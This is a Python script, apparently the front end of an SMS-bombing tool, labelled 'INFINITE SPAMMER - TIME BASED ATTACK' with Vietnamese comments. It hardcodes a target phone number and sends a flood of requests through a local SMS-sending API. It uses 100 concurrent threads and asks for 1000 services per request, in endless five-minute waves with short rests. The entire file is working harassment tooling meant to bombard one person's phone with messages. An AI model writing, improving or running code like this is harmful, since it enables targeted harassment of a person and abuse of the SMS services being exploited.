# -*- coding: utf-8 -*-
"""
INFINITE SPAMMER - TIME BASED ATTACK - MAX POWER
"""
import requests
import json
import sys
import time
from concurrent.futures import ThreadPoolExecutor

# Fix encoding
if sys.platform == 'win32':
    sys.stdout.reconfigure(encoding='utf-8')

PHONE = "0865526740"
URL = "http://localhost:8000/api/sms/send"

# CAU HINH THOI GIAN MAX POWER
RUN_DURATION = 300        # 5 phut
COOLDOWN_DURATION = 60    # 60s nghi
CONCURRENT_REQUESTS = 100 # 100 luong
SERVICES_PER_REQ = 1000   # 1000 services/req

print(f"🚀 KICH HOAT CHE DO SPAM THEO THOI GIAN - MAX CONTACT 🚀")
print(f"Target: {PHONE}")
print(f"Cau hinh:")
print(f"  - Thoi gian chay: {RUN_DURATION} giay")
print(f"  - Thoi gian nghi: {COOLDOWN_DURATION} giay")
print(f"  - Toc do: {CONCURRENT_REQUESTS} threads x {SERVICES_PER_REQ} services")
print("=" * 60)

def send_request(_):
    try:
        data = {"phone": PHONE, "amount": SERVICES_PER_REQ}
        # Timeout 3s - ban la quen luon
        requests.post(URL, json=data, timeout=3)
        return True
    except:
        return False

def run_wave(wave_num):
    print(f"\n🌊 WAVE {wave_num} STARTING - RUNNING FOR {RUN_DURATION} SECONDS...")
    end_time = time.time() + RUN_DURATION
    
    total_sent = 0
    count = 0
    
    with ThreadPoolExecutor(max_workers=CONCURRENT_REQUESTS) as executor:
        while time.time() < end_time:
            # Tao 1 batch request
            futures = [executor.submit(send_request, i) for i in range(CONCURRENT_REQUESTS)]
            
            # Khong can doi ket qua
            count += CONCURRENT_REQUESTS
            total_sent += (CONCURRENT_REQUESTS * SERVICES_PER_REQ)
            
            # Log nhe moi 5000 request (giam log lai cho do lag)
            if count % 2000 == 0:
                elapsed = RUN_DURATION - (end_time - time.time())
                print(f"  [{elapsed:.0f}s] Da kich hoat {total_sent} SMS commands...")
                
            # KHONG SLEEP - MAX SPEED
            # time.sleep(0.01) 
            
    return total_sent

# Loop vo tan
wave = 1
while True:
    sent = run_wave(wave)
    print(f"\n✅ WAVE {wave} COMPLETE - SENT APPROX {sent} COMMANDS")
    print(f"😴 Bat dau nghi {COOLDOWN_DURATION} giay...")
    
    for i in range(COOLDOWN_DURATION, 0, -1):
        print(f"  Con {i}s...", end='\r')
        time.sleep(1)
        
    print("\n🚀 DONE RESTING - NEXT WAVE!")
    wave += 1
